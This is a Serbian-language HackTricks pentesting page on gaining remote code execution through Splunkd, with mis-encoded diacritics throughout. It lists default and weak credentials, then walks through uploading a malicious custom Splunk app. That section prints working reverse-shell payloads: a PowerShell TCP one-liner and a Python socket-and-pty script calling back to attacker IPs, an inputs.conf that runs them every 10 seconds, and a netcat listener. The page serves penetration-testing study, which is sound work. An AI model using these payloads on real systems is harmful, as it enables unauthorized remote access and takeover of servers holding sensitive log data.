# 8089 - Pentestiranje Splunkd

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite videti **oglaÅ¡avanje vaÅ¡e kompanije na HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

Splunk je alat za **analizu logova** koji igra kljuÄnu ulogu u **prikupljanju, analiziranju i vizualizaciji podataka**. Iako mu prvobitna svrha nije bila da sluÅ¾i kao alat za **SIEM (Security Information and Event Management)**, stekao je popularnost u oblasti **sigurnosnog nadzora** i **poslovne analitike**.

Splunk implementacije se Äesto koriste za skladiÅ¡tenje **osetljivih podataka** i mogu predstavljati **vredan izvor informacija** za potencijalne napadaÄe ukoliko uspeju da kompromituju sistem.
**Podrazumevani port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Splunk veb server podrazumevano radi na portu 8000.
{% endhint %}

## Enumeracija

### Besplatna verzija

Splunk Enterprise probna verzija se pretvara u **besplatnu verziju nakon 60 dana**, koja **ne zahteva autentifikaciju**. Nije neobiÄno da sistem administratori instaliraju probnu verziju Splunka kako bi je testirali, a zatim je **zaborave**. Ovo Ä‡e se automatski pretvoriti u besplatnu verziju koja nema nikakav oblik autentifikacije, uvodeÄ‡i sigurnosnu rupu u okruÅ¾enju. Neke organizacije mogu izabrati besplatnu verziju zbog ograniÄenja budÅ¾eta, ne shvatajuÄ‡i u potpunosti implikacije nemoguÄ‡nosti upravljanja korisnicima/ulogama.

### Podrazumevani pristupni podaci

Na starijim verzijama Splunka, podrazumevani pristupni podaci su **`admin:changeme`**, koji su prikazani na stranici za prijavu.\
MeÄ‘utim, **najnovija verzija Splunka** postavlja **pristupne podatke tokom procesa instalacije**. Ako podrazumevani pristupni podaci ne funkcioniÅ¡u, vredi proveriti uobiÄajene slabe lozinke poput `admin`, `Welcome`, `Welcome1`, `Password123`, itd.

### Dobijanje informacija

Nakon prijave na Splunk, moÅ¾emo **pregledati podatke**, pokretati **izveÅ¡taje**, kreirati **instrument table**, **instalirati aplikacije** iz Splunkbase biblioteke i instalirati prilagoÄ‘ene aplikacije.\
TakoÄ‘e moÅ¾ete pokretati kod: Splunk ima viÅ¡e naÄina za **pokretanje koda**, kao Å¡to su Django aplikacije na serverskoj strani, REST endpointi, skriptovani ulazi i skripte za upozorenja. UobiÄajeni naÄin dobijanja udaljenog izvrÅ¡avanja koda na Splunk serveru je kroz upotrebu skriptovanog ulaza.

Osim toga, poÅ¡to se Splunk moÅ¾e instalirati na Windows ili Linux hostovima, mogu se kreirati skriptovani ulazi za pokretanje Bash, PowerShell ili Batch skripti.

### Shodan

* `Splunk build`

## RCE

### Kreiranje prilagoÄ‘ene aplikacije

PrilagoÄ‘ena aplikacija moÅ¾e pokretati **Python, Batch, Bash ili PowerShell skripte**.\
Imajte na umu da **Splunk dolazi sa instaliranim Pythonom**, pa Äak i na **Windows** sistemima moÅ¾ete pokretati Python kod.

MoÅ¾ete koristiti [**ovaj**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paket da nam pomogne. **`bin`** direktorijum u ovom repozitorijumu ima primere za [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) i [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Hajde da proÄ‘emo kroz ovo korak po korak.

Da bismo to postigli, prvo moramo kreirati prilagoÄ‘enu Splunk aplikaciju koristeÄ‡i sledeÄ‡u strukturu direktorijuma:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** direktorijum Ä‡e sadrÅ¾ati sve **skripte koje nameravamo da pokrenemo** (u ovom sluÄaju, **PowerShell** reverse shell), a podrazumevani direktorijum Ä‡e sadrÅ¾ati naÅ¡ `inputs.conf` fajl. NaÅ¡ reverse shell Ä‡e biti **PowerShell jednolinijski kod:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Fajl [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) govori Splunku **koji skript da pokrene** i bilo koje druge uslove. Ovde postavljamo aplikaciju kao omoguÄ‡enu i kaÅ¾emo Splunku da pokrene skriptu svakih 10 sekundi. Interval je uvek u sekundama, a ulaz (skripta) Ä‡e se pokrenuti samo ako je ova postavka prisutna.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Potrebno nam je `.bat` fajl koji Ä‡e se pokrenuti prilikom implementacije aplikacije i izvrÅ¡iti PowerShell jednolinijski kod.

SledeÄ‡i korak je odabrati `Install app from file` i otpremiti aplikaciju.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

Pre otpremanja zlonamerne prilagoÄ‘ene aplikacije, pokrenimo sluÅ¡aoca koristeÄ‡i Netcat ili [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na stranici `Uploaduj aplikaciju`, kliknite na `PretraÅ¾i`, izaberite tarball koji smo prethodno kreirali i kliknite na `Upload`. ÄŒim **uploadujemo aplikaciju**, primiÄ‡emo **obrnuti shell** jer Ä‡e se status aplikacije automatski promeniti u `OmoguÄ‡eno`.

#### Linux

Ako se bavimo **Linux hostom**, morali bismo **izmeniti Python skriptu `rev.py`** pre nego Å¡to kreiramo tarball i uploadujemo prilagoÄ‘enu zlonamernu aplikaciju. Ostatak procesa bi bio isti, i dobili bismo obrnutu shell konekciju na naÅ¡em Netcat sluÅ¡aocu i mogli bismo da nastavimo sa napadom.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Eskalacija privilegija

Na sledeÄ‡oj stranici moÅ¾ete pronaÄ‡i objaÅ¡njenje kako se ovaj servis moÅ¾e zloupotrebiti radi eskalacije privilegija i postizanja trajnosti:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Reference

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
